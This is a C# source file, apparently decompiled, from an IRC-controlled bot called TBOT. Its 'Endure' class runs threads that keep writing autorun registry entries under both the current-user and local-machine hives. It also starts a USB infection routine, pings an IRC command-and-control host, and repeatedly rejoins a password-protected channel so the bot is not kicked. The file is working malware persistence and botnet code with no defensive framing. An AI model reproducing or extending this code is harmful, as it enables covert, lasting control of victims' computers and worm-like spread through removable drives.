using System;
using System.Net.Sockets;
using System.Threading;
using Microsoft.Win32;

namespace TBOT;

internal class Endure
{
	public static void Begin()
	{
		new Thread(preReg).Start();
		new Thread(USBInfect.infect).Start();
		new Thread(pingPong).Start();
		new Thread(antiKick).Start();
	}

	private static void preReg()
	{
		while (true)
		{
			Thread.Sleep(60000);
			string[] startupKeys = Config.startupKeys;
			foreach (string subkey in startupKeys)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
				if ((string)registryKey.GetValue(Config.startupName, "") == "")
				{
					registryKey.SetValue(Config.startupName, Config.installPath + Config.installFile);
				}
			}
			string[] startupKeys2 = Config.startupKeys;
			foreach (string subkey2 in startupKeys2)
			{
				try
				{
					RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey(subkey2);
					if ((string)registryKey2.GetValue(Config.startupName, "") == "")
					{
						registryKey2.SetValue(Config.startupName, Config.installPath + Config.installFile);
					}
				}
				catch (Exception)
				{
				}
			}
		}
	}

	private static void pingPong()
	{
		while (true)
		{
			try
			{
				Irc.Write("PING :" + Config.ircHost);
			}
			catch (Exception)
			{
				Irc.ircClient = new TcpClient();
				Thread.Sleep(8000);
				Environment.Exit(0);
			}
			Thread.Sleep(12000);
		}
	}

	private static void antiKick()
	{
		while (true)
		{
			Thread.Sleep(120000);
			Irc.Write("JOIN " + Config.ircChannel + " " + Config.ircChannelPass);
		}
	}
}
